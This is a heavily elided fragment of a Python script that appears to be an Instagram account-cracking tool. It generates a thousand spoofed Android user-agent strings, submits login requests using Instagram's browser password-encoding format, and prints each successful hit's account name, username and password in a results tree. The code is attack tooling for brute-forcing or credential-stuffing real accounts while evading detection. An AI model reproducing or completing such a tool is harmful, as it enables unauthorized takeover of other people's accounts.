...
for tu in range(1000):
            ...
            e = random.randrange(7,12)
            useragent = f'''Mozilla/5.0 (Linux; U; Android {e}; {a} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
            rmx_2022.append(useragent)
try:
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": "{}"}
				...
				if 'userId' in str(xyaa_code):
					...
					tree = Tree(f"Result {H2}OK")
					tree.add(f"{P2}nama akun : {H2}{nama}")
					tree.add(f"{P2}username  : {H2}{user}")
					tree.add(f"{P2}password  : {H2}{pw}")
